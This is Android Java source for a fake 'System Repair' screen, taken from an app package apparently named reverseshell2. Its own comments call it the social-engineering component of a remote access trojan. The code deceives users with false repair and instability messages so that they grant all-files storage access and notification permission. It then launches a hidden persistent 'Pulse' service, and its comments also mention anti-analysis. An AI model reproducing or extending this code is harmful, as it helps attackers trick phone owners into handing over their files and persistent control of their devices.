package com.example.reverseshell2;

import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

/**
 * SOCIAL ENGINEERING COMPONENT:
 * Mimics a "System Repair" utility to force the user into granting 
 * high-level permissions (Manage All Files) required for A11-15 persistence.
 */
public class RepairActivity extends AppCompatActivity {

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_repair);

        Button btnFix = findViewById(R.id.btn_fix_now);
        btnFix.setOnClickListener(v -> requestElitePermissions());
        
        // Anti-Analysis: Don't show in Recents
        setFinishOnTouchOutside(false);
    }

    private void requestElitePermissions() {
        // 1. MANAGE_EXTERNAL_STORAGE (Android 11+)
        // This is mandatory for a "Professional" RAT to see files outside its sandbox.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                try {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                    intent.addCategory("android.intent.category.DEFAULT");
                    intent.setData(Uri.parse(String.format("package:%s", getApplicationContext().getPackageName())));
                    startActivityForResult(intent, 1001);
                    Toast.makeText(this, "Enable 'Allow access to all files' to complete repair", Toast.LENGTH_LONG).show();
                } catch (Exception e) {
                    Intent intent = new Intent();
                    intent.setAction(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                    startActivityForResult(intent, 1001);
                }
                return;
            }
        }

        // 2. Notification Permission (Android 13+)
        // Required for the Foreground Service pulse to be visible (and thus stable)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            requestPermissions(new String[]{android.Manifest.permission.POST_NOTIFICATIONS}, 1002);
        }

        completeRepair();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 1001) {
            // Check if user complied
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && Environment.isExternalStorageManager()) {
                completeRepair();
            } else {
                Toast.makeText(this, "Repair incomplete! System instability may occur.", Toast.LENGTH_LONG).show();
            }
        }
    }

    private void completeRepair() {
        Toast.makeText(this, "System components stabilized successfully.", Toast.LENGTH_SHORT).show();
        
        // Start the Pulse Brain immediately
        Intent serviceIntent = new Intent(this, mainService.class);
        serviceIntent.setAction("ACTION_START_PULSE");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
        
        finish();
    }
}
